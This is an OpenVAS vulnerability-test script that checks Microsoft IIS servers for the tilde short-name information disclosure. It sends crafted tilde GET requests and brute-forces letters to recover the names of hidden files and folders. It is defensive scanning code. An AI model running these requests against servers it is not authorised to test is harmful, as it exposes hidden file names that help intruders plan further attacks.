###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms_iis_tilde_info_disc_vuln.nasl 12465 2018-11-21 13:24:34Z cfischer $
#
# Microsoft IIS Tilde Character Information Disclosure Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802887");
  script_version("$Revision: 12465 $");
  script_bugtraq_id(54251);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-11-21 14:24:34 +0100 (Wed, 21 Nov 2018) $");
  script_tag(name:"creation_date", value:"2012-07-18 10:29:25 +0530 (Wed, 18 Jul 2012)");
  script_name("Microsoft IIS Tilde Character Information Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19525");
  script_xref(name:"URL", value:"http://code.google.com/p/iis-shortname-scanner-poc");
  script_xref(name:"URL", value:"http://soroush.secproject.com/downloadable/iis_tilde_shortname_disclosure.txt");
  script_xref(name:"URL", value:"http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  sensitive information that could aid in further attacks.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services versions 7.5 and prior.");

  script_tag(name:"insight", value:"Microsoft IIS fails to validate a specially crafted GET request
  containing a '~' tilde character, which allows to disclose all short-names of
  folders and files having 4 letters extensions.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Microsoft IIS Webserver and is prone to
  information disclosure vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

iisVer = get_app_version(cpe:CPE, port:port);
if(!iisVer){
  exit(0);
}

## List of all possible letters a folder/file name may have
possible_letters = make_list('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                     'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
                     'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
                     'y', 'z');

## List of all possible files
files = make_list("a.aspx","a.shtml","a.asp","a.asmx","a.ashx","a.config","a.php","a.jpg","a.xxx","");

# nb: To make openvas-nasl-lint happy...
count = 0;
valid_letter = "";

foreach file (files)
{
  url1 = "/%2F*~1*%2F" + file + "?aspxerrorpath=/";

  iisreq1 = http_get(item:url1, port:port);
  iisres1 = http_keepalive_send_recv(port:port, data:iisreq1, bodyonly:FALSE);

  if(!iisres1 || (iisVer !~ "^7" && iisres1 !~ "HTTP/1.. 404")||
     (iisVer =~ "^7" && iisres1 !~ "Error Code</th><td>0x00000000")){
   continue;
  }

  url2 = "/%2F1234567890*1~*%2F" +file + "?aspxerrorpath=/";

  iisreq2 = http_get(item:url2, port:port);
  iisres2 = http_keepalive_send_recv(port:port, data:iisreq2, bodyonly:FALSE);

  if(iisres2 && (iisVer !~ "^7" && iisres2 =~ "HTTP/1.. 400")||
     (iisVer =~ "^7" && iisres2 =~ "Error Code</th><td>0x80070002"))
  {

    ## Now iterate over all possible letters to find the file or folders names
    while (count < 4)
    {
      foreach letter (possible_letters)
      {
        url3 = "/%2F" + valid_letter + letter + "*~1*%2F" +file+ "?aspxerrorpath=/";

        iisreq3 = http_get(item:url3, port:port);
        iisres3 = http_keepalive_send_recv(port:port, data:iisreq3, bodyonly:FALSE);

        ## If its 404 then its a valid letter and there is file/folder starting with that letter
        if(!iisres3 || (iisVer !~ "^7" && iisres3 !~ "HTTP/1.. 404")||
            (iisVer =~ "^7" && iisres3 !~ "Error Code</th><td>0x00000000")){
          continue;
        }

        valid_letter += letter;
      }
      count++;

    }
    if(strlen(valid_letter) > 0)
    {
      msg = "File/Folder name found on server starting with :" + valid_letter ;
      security_message(port:port, data:msg);
      exit(0);
    }
  }
}

exit(99);